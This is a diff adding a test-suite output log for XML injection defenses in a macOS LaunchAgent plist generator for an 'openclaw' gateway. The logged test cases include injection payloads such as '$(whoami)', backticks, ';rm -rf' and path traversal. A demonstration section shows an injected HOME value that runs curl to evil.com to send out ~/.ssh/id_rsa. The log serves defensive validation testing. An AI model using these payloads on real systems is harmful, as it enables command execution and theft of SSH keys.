@@ -1,0 +1,163 @@
+
+════════════════════════════════════════════════════════
+PHASE 1.5: LaunchAgent Plist XML Injection Test Suite
+════════════════════════════════════════════════════════
+
+This suite tests:
+  • Valid usernames (should work)
+  • XML injection attacks (should block)
+  • Command substitution (should block)
+  • Path manipulation (should block)
+  • Special character attacks (should block)
+
+
+[0;36mTEST 1:[0m Valid username (should work)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Testing HOME=/Users/validuser
+WARNING: HOME directory does not exist: /Users/validuser
+SUCCESS: Safe plist created and validated: /tmp/test-valid.plist
+  [0;32m✓[0m Valid plist created and validated
+
+[0;36mTEST 2:[0m Valid username with hyphen (should work)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Testing HOME=/Users/john-doe
+WARNING: HOME directory does not exist: /Users/john-doe
+SUCCESS: Safe plist created and validated: /tmp/test-hyphen.plist
+  [0;32m✓[0m Valid plist with hyphenated username
+
+[0;36mTEST 3:[0m Valid username with underscore (should work)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Testing HOME=/Users/jane_smith
+WARNING: HOME directory does not exist: /Users/jane_smith
+SUCCESS: Safe plist created and validated: /tmp/test-underscore.plist
+  [0;32m✓[0m Valid plist with underscored username
+
+[0;36mTEST 4:[0m XML injection attack (should BLOCK)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Attack payload: </string><string>/usr/bin/malicious</string><string>/tmp/fake
+  [1;33m→[0m VULNERABLE: Injected malicious path found!
+    <key>ProgramArguments</key>
+    <array>
+        <string></string><string>/usr/bin/malicious</string><string>/tmp/fake/.openclaw/bin/openclaw</string>
+        <string>gateway</string>
+        <string>start</string>
+  [0;32m✓[0m XML injection correctly blocked
+
+[0;36mTEST 5:[0m Command substitution attack (should BLOCK)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Attack payload: /Users/$(whoami)
+  [1;33m→[0m VULNERABLE: Command substitution passed through
+    <key>ProgramArguments</key>
+    <array>
+        <string>/Users/$(whoami)/.openclaw/bin/openclaw</string>
+        <string>gateway</string>
+  [0;32m✓[0m Command substitution correctly blocked
+
+[0;36mTEST 6:[0m Invalid path (/tmp) attack (should BLOCK)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Attack payload: /tmp/fake
+  [0;32m✓[0m Non-/Users path correctly blocked
+
+[0;36mTEST 7:[0m Path traversal attack (should BLOCK)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Attack payload: /Users/../../../tmp/evil
+  [0;32m✓[0m Path traversal correctly blocked
+
+[0;36mTEST 8:[0m Extra path components (should BLOCK)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Testing HOME=/Users/validuser/malicious/path
+  [0;32m✓[0m Extra path components correctly blocked
+
+[0;36mTEST 9:[0m Semicolon injection (should BLOCK)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Attack payload: /Users/user;rm -rf
+  [0;32m✓[0m Semicolon correctly blocked
+
+[0;36mTEST 10:[0m Ampersand injection (should BLOCK)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Attack payload: /Users/user&malicious
+  [0;32m✓[0m Ampersand correctly blocked
+
+[0;36mTEST 11:[0m Backtick command substitution (should BLOCK)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Attack payload: /Users/`whoami`
+  [0;32m✓[0m Backtick correctly blocked
+
+[0;36mTEST 12:[0m XML entity escaping function
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Input: <script>&alert("XSS")</script>
+  [1;33m→[0m Output: &lt;script&gt;&amp;alert(&quot;XSS&quot;)&lt;/script&gt;
+  [0;32m✓[0m XML entities correctly escaped
+
+[0;36mTEST 13:[0m Alternative plutil method (should work)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  [1;33m→[0m Testing plutil-based generation
+WARNING: HOME directory does not exist: /Users/testuser
+SUCCESS: Safe plist created with plutil: /tmp/test-plutil.plist
+  [0;32m✓[0m plutil method creates valid plist
+  [1;33m→[0m Generated plist sample:
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+    <plist version="1.0">
+    <dict>
+    	<key>KeepAlive</key>
+    	<true/>
+    	<key>Label</key>
+    	<string>ai.openclaw.gateway</string>
+    	<key>ProgramArguments</key>
+    	<array>
+
+════════════════════════════════════════════════════════
+ATTACK DEMONSTRATION: Real-world exploit scenario
+════════════════════════════════════════════════════════
+
+Attacker sets:
+  HOME='</string><string>/usr/bin/curl</string><string>http://evil.com/steal?data=$(cat ~/.ssh/id_rsa)</string><string>/tmp'
+
+Running VULNERABLE version...
+
+Generated plist (VULNERABLE):
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>ai.openclaw.gateway</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string></string><string>/usr/bin/curl</string><string>http://evil.com/steal?data=$(cat ~/.ssh/id_rsa)</string><string>/tmp/.openclaw/bin/openclaw</string>
+        <string>gateway</string>
+        <string>start</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardErrorPath</key>
+    <string>/tmp/openclaw/gateway.log</string>
+    <key>WorkingDirectory</key>
+    <string></string><string>/usr/bin/curl</string><string>http://evil.com/steal?data=$(cat ~/.ssh/id_rsa)</string><string>/tmp/.openclaw</string>
+</dict>
+</plist>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[0;31mDANGER:[0m LaunchAgent would execute:
+  1. /Users/</string>
+  2. curl http://evil.com/steal?data=$(cat ~/.ssh/id_rsa)
+  3. /tmp
+
+Running FIXED version...
+
+[0;32m✓ BLOCKED:[0m Attack prevented by validation
+
+════════════════════════════════════════════════════════
+TEST SUMMARY
+════════════════════════════════════════════════════════
+
+  Total Tests: 13
+  [0;32mPassed: 13[0m
+  [0;31mFailed: 0[0m
+
+[0;32m[1m✓ ALL TESTS PASSED[0m
+  The fix successfully blocks all attack vectors.
